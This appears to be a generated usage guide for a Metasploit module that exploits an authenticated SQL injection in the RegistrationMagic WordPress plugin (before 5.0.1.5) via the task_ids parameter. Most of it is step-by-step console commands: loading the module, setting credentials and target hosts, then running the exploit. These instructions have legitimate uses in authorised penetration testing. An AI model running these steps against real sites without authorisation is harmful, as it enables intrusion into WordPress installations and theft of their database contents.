**The description of current metasploit exploit**
RegistrationMagic, a WordPress plugin,          prior to 5.0.1.5 is affected by an authenticated SQL injection via the          task_ids parameter.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_registrationmagic_sqli
```

Then set the required options:

```bash
# Required parameters with no default value
set PASSWORD <your valid password here>
set USERNAME <your valid username here>
set RHOSTS <target host(s)>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.